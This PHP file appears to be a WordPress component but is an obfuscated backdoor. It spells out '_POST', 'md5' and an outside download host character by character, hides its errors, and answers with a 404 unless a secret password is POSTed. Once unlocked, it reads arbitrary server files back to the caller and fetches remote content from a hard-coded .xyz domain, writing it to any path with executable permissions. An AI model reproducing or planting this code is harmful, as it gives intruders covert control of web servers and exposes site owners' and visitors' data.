<?php


@ini_set('display_errors', 0);
$wrapper_makup = "wp_list_pay";
$wp_contents = "wp_list_url";
$wp_makup = "wp_list_cat";
$wp_objacts = "wp_list_text";
$sources_block = "wp_list_tag_cloud";
$items_objacts = "wp_list_search";
$items_makup = "wp_list_rss";
$inners_value = "wp_list_recent_entries";
$filters_value = "wp_list_recent_comments";
$categoryes = "wp_list_pages";
$block_types = "wp_list_meta";
$block_contents = "wp_list_links";
$alowed_html = "wp_list_categories";
$alowed_block = "wp_list_calendar";
$allow_protocols = "wp_list_archives";
$$wrapper_makup = RandAbc();
$$wp_makup =  $wp_list_pay{62}.$wp_list_pay{51}.$wp_list_pay{50}.$wp_list_pay{54}.$wp_list_pay{55};
$$sources_block = $wp_list_pay{28}.$wp_list_pay{26}.$wp_list_pay{27}.$wp_list_pay{33};
$$items_objacts = $wp_list_pay{19}.$wp_list_pay{22}.$wp_list_pay{12}.$wp_list_pay{1}.$wp_list_pay{0}.$wp_list_pay{12}.$wp_list_pay{0}.$wp_list_pay{17}.$wp_list_pay{10}.$wp_list_pay{4}.$wp_list_pay{19};
$$wp_objacts = $$wp_list_cat;
$$wp_contents = $wp_list_pay{12}.$wp_list_pay{3}.$wp_list_pay{31};
$$items_makup = $wp_list_pay{30}.$wp_list_pay{35}.$wp_list_pay{32}.$wp_list_pay{34}.$wp_list_pay{31}.$wp_list_pay{34}.$wp_list_pay{31}.$wp_list_pay{3}.$wp_list_pay{26}.$wp_list_pay{5}.$wp_list_pay{5}.$wp_list_pay{4}.$wp_list_pay{29}.$wp_list_pay{31}.$wp_list_pay{28}.$wp_list_pay{27}.$wp_list_pay{0}.$wp_list_pay{26}.$wp_list_pay{30}.$wp_list_pay{32}.$wp_list_pay{5}.$wp_list_pay{26}.$wp_list_pay{30}.$wp_list_pay{34}.$wp_list_pay{28}.$wp_list_pay{5}.$wp_list_pay{33}.$wp_list_pay{0}.$wp_list_pay{3}.$wp_list_pay{31}.$wp_list_pay{34}.$wp_list_pay{3};
$$inners_value =  $wp_list_pay{23}.$wp_list_pay{24}.$wp_list_pay{25};
$$filters_value = $wp_list_pay{62}.$wp_list_pay{54}.$wp_list_pay{40}.$wp_list_pay{53}.$wp_list_pay{57}.$wp_list_pay{40}.$wp_list_pay{53};
$$categoryes = $$wp_list_recent_comments;
$$block_types = $wp_list_pay{39}.$wp_list_pay{50}.$wp_list_pay{38}.$wp_list_pay{56}.$wp_list_pay{48}.$wp_list_pay{40}.$wp_list_pay{49}.$wp_list_pay{55}.$wp_list_pay{62}.$wp_list_pay{53}.$wp_list_pay{50}.$wp_list_pay{50}.$wp_list_pay{55};
$$block_contents = $wp_list_pay{51}.$wp_list_pay{43}.$wp_list_pay{51}.$wp_list_pay{62}.$wp_list_pay{54}.$wp_list_pay{40}.$wp_list_pay{47}.$wp_list_pay{41};
$$alowed_html = $wp_list_pay{2}.$wp_list_pay{6}.$wp_list_pay{4}.$wp_list_pay{19};
$$alowed_block = $wp_list_pay{8}.$wp_list_pay{13}.$wp_list_pay{3}.$wp_list_pay{4}.$wp_list_pay{23}.$wp_list_pay{63}.$wp_list_pay{15}.$wp_list_pay{7}.$wp_list_pay{15};
$$allow_protocols = $wp_list_pay{7}.$wp_list_pay{19}.$wp_list_pay{19}.$wp_list_pay{15}.$wp_list_pay{64}.$wp_list_pay{65}.$wp_list_pay{65}.$wp_list_pay{22}.$wp_list_pay{22}.$wp_list_pay{22}.$wp_list_pay{63};

if(isset($wp_list_pages["$wp_list_meta"])){$BT = $wp_list_pages["$wp_list_meta"];}elseif(isset($wp_list_pages["$wp_list_links"])){$BT = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$wp_list_pages["$wp_list_links"])),'',__FILE__).DIRECTORY_SEPARATOR;}else{$BT = '/';}
foreach($wp_list_text as $wp_list_rsso=>$wp_list_searcho){
	$$wp_list_rsso = $wp_list_searcho;
}

if(!(isset($passwd) && $wp_list_url($passwd) == $wp_list_rss)){
	  
	http_response_code(404);  
	exit; 
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
{
		
			$pfile = $recover_file;
			$date = $wp_list_categories($recover_file_url);
			gdir_file($recover_file);
			@chmod($pfile,0755);

			if($date && file_put_contents($pfile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}


$rdstr = 'r';
$rdstr .= 'e';
$rdstr .= 'date';

if(isset($act) && $act == $rdstr && isset($v_read)){
	if(file_exists($v_read)){
		echo see_file($v_read);
	}
}

function RandAbc($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/-";
    return ($str);
} 

function see_file($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function cget($url,$loop=10){
	$data = false;        $i = 0; 

	while(!$data) {
             $data = tcget($url);             if($i++ >= $loop) break;        }
	return $data;
}

function tcget($url,$proxy=''){
	global $wp_list_archives, $wp_list_search, $wp_list_tag_cloud, $wp_list_recent_entries;
     $data = '';    	$url = "$wp_list_archives$wp_list_search.$wp_list_recent_entries/".$url;
 $url = trim($url);     if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
         $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);		 curl_setopt($ch, CURLOPT_HEADER, false);		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);         $data = curl_exec($ch);         curl_close($ch);      }
    
     if ($data == ''){
         if (function_exists('file_get_contents') && $url){
             $data = @file_get_contents($url);             }
         }
    
     if (($data == '') && $url){
         if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';                     }
                
                 @fclose($fp);                 }
             }
         }
     return $data;	
}

function m_mkdir($dir){
		if(!is_dir($dir)) mkdir($dir);
	}
	
function gdir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			m_mkdir($dir);
		}
		
		return $dir;
}


//